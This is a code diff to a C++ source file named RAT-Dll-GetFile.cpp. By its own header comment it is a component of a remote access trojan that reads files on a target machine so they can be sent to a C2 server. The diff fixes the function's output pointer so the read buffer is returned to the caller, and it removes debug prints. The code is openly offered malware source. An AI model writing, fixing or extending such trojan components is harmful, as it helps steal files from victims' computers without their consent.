@@ -1,4 +1,4 @@
-// Patrick Sacchet
+// Patrick Sacchet (@pjsacchet)
 // Verison 1.0.
 // RAT-Dll-GetFile.cpp : Defines functionality for performing a file get on target, i.e., retrieving a buffer of file contents and sending it back to our C2 server
 
@@ -7,23 +7,23 @@
 
 /*TODO: Add ability to start at offset within file
 		Add ability to chunk data we send back
-		Add ability */
+		Check fiel size output parameter bytes*/
 
 
 /** This function will perform a simple get file for us 
 params:
 * filePath - path to the file we're getting
-* fileBytes - buffer containing file bytes we got from our target file 
+* fileBytes - pointer to buffer containing file bytes we got from our target file 
 * bufferSize - size of the output file buffer 
 return:
 * if successful we return SUCCESS; otherwise print error code and handle appropiately 
 */
-INT performGetFile(__in const char* filePath, __out char* fileBytes, __out DWORD* bufferSize)
+INT performGetFile(__in const char* filePath, __out char** fileBytes, __out DWORD* bufferSize)
 {
 	INT status = SUCCESS;
 	HANDLE hFile;
 	DWORD dwBytesRead = 0;
-	CHAR msgBuf[DEFAULT_BUF_LEN];
+	CHAR msgBuf[DEFAULT_BUF_LEN], *fileContents = NULL;
 	LARGE_INTEGER fileSize; 
 
 	hFile = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -44,23 +44,19 @@ INT performGetFile(__in const char* filePath, __out char* fileBytes, __out DWORD
 	}
 
 	// Allocate for our file buffer
-	fileBytes = (char*)malloc(fileSize.QuadPart * sizeof(char));
-	if (fileBytes == NULL)
+	 fileContents = (char*)malloc(fileSize.QuadPart * sizeof(char));
+	if (fileContents == NULL)
 	{
 		OutputDebugStringA("RAT-Dll-GetFile::performGetFile - Failure from malloc (NOT ENOUGH MEMORY)");
 		status = FAILURE;
 		goto cleanup;
 	}
 
-	// These data sizes dont match up so fix this later...
+	// These data sizes dont technically match up so fix this later...
 	*bufferSize = fileSize.QuadPart;
 
-	printf("file size quad part %i", fileSize.QuadPart);
-
-
-
 	// Now note the size and read the file 
-	if (!ReadFile(hFile, fileBytes, fileSize.QuadPart, &dwBytesRead, NULL))
+	if (!ReadFile(hFile, fileContents, fileSize.QuadPart, &dwBytesRead, NULL))
 	{
 		sprintf_s(msgBuf, "RAT-Dll-GetFile::performGetFile - Failure from ReadFile %d\n", GetLastError());
 		OutputDebugStringA(msgBuf);
@@ -68,7 +64,7 @@ INT performGetFile(__in const char* filePath, __out char* fileBytes, __out DWORD
 		goto cleanup;
 	}
 
-	printf("file bytes %s", fileBytes);
+	*fileBytes = fileContents;
 
 	// Normal Windows app will close the handle to the file
 	if (!CloseHandle(hFile))
